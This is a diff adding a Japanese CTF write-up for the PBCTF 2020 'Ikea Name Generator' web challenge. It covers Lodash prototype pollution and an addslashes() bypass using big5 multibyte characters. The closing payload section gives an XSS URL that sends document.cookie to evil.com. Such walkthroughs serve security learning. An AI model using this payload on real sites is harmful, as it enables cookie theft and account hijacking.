@@ -830,6 +830,119 @@ https://mnorris.io/hackerone%20ctf/h1_Micro-CMS_v1/
 「ページの内容」フォーム内では`<script>`タグが弾かれているが`<button onclick=alert('XSS')>Some button</button>`,`<img src='whatever' onclick=alert('XSS')>`みたいなそれ以外ではJSが実行できる。  
 また、「タイトル」内では`<script>`がサニタイジングされずにTOPページに埋め込まれるのでXSSができる。  
 
+## bypass addslashes() with %bf%5c$22 / Prototype Polution (PBCTF 2020 - Ikea Name Generator)
+https://w0y.at/category/writeup.html  
+https://blog.jimmyli.us/articles/2020-12/PerfectBlueCTF-WebExploitaiton  
+- **entrypoint**   
+ルート上で`/?name=<name>`として送信した値が以下の`app.js`によって、`CONFIG.URL`の中身`/config.php?name=<name>`に設定されてPOSTで送信されて、JSONを返してそれを`iframe`を使って`sandbox.php`に渡しているらしい。  
+```js
+function createFromObject(obj) {
+  var el = document.createElement("span");
+
+  for (var key in obj) {
+    el[key] = obj[key]
+  }
+
+  return el
+}
+
+function generateName() {
+
+  var default_config = {
+    "style": "color: red;",
+    "text": "Could not generate name"
+  }
+
+  var output = document.getElementById('output')
+  var req = new XMLHttpRequest();
+
+  req.open("POST", CONFIG.url);
+  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+  req.onreadystatechange = function () {
+
+    if (req.readyState === XMLHttpRequest.DONE) {
+      if (req.status === 200) {
+        var obj = JSON.parse(req.responseText);
+        var config = _.merge(default_config, obj)
+
+
+        sandbox = document.createElement("iframe")
+        sandbox.src = "/sandbox.php"
+        var el = createFromObject({
+          style: config.style,
+          innerText: config.text
+        })
+
+        output.appendChild(sandbox)
+        sandbox.onload = function () {
+          sandbox.contentWindow.output.appendChild(el)
+        }
+      }
+    }
+  }
+
+  req.send("name=" + CONFIG.name)
+}
+
+window.onload = function() {
+  document.getElementById("button-submit").onclick = function() {
+    window.location = "/?name=" + document.getElementById("input-name").value
+  }
+
+  generateName();
+}
+```
+以下のようにCSPが適用されていることから、Angular.jsのCSP bypassか、Lodashのプロトタイプ汚染だと推測できるらしい。  
+```txt
+// /
+Content-Security-Policy: default-src 'none';script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.4/lodash.min.js;connect-src 'self';frame-src 'self';img-src 'self';style-src 'self' https://maxcdn.bootstrapcdn.com/;base-uri 'none';
+
+// /404.php
+Content-Security-Policy: default-src 'none'
+
+// /sandbox.php
+Content-Security-Policy: default-src 'none';script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js;style-src 'self' https://maxcdn.bootstrapcdn.com/;connect-src https:;base-uri 'none';
+```
+プロトタイプ汚染による解法は以下を参照。  
+https://blog.jimmyli.us/articles/2020-12/PerfectBlueCTF-WebExploitaiton  
+  
+以下では、入力された`/?name=<name>`が以下のように`CONFIG`オブジェクトにセットされるため、ここに`document.location = ...`みたいにしてXSSしようとしてみる。  
+```js
+CONFIG = {
+  url: "/get_name.php",
+  name: "John",             // ここ！
+  url: "/404.php?msg=<data>"
+}
+```
+`"`をバイパスできればJSON Injection的な感じで任意のフィールドを設定できるかもなのでそれを試すと、以下のように`\"`としてエスケープされる。  
+```js
+CONFIG = {
+  url: "/get_name.php",
+  name: "John\", url: \"\/404.php?msg=foobar"
+}
+```
+ここで、もし`addslashes()`関数を使用してエスケープしているなら、`%bf%22`のような入力を`addslashes()`した場合、`%bf%5c%22`としてバックスラッシュ`%5c`が`"`の前に追加されるが、文字セットが`big5tbl`の場合、`%bf%5c`は漢字として扱われる。  
+よって`"`をバイパスすることができる！以下参照  
+https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string  
+
+- **Payload**   
+```txt
+// name=<script charset=big5 src=config.php?name=%bf%22,foo:window.location=`http://evil.com/${document.cookie}`<!--
+http://ikea-name-generator.chal.perfect.blue/?name=%3Cscript%20charset=big5%20src=config.php?name=%bf%22,foo:window.location=`http://evil.com/${document.cookie}`%3c!--
+```
+これを送信すればCONFIGオブジェクトには以下のように新しいフィールドが作成されるのでXSSが発動する！  
+```js
+CONFIG = {
+  url: "/get_name.php",
+  name: "璞",
+  foo: window.location=`http:\/\/evil.com\/${document.cookie}` // omitted <!-- for clarity
+}
+```
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
 ## 
 - **entrypoint**   
 - **概要**   
